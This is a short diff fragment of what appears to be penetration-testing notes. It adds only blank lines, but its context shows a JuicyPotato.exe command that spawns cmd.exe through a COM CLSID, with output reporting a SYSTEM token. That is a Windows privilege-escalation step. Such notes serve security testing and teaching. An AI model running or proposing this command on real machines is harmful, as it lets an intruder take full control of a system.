@@ -21,3 +21,5 @@ JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-45
     {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
     [+] CreateProcessWithTokenW OK
 ```
+
+
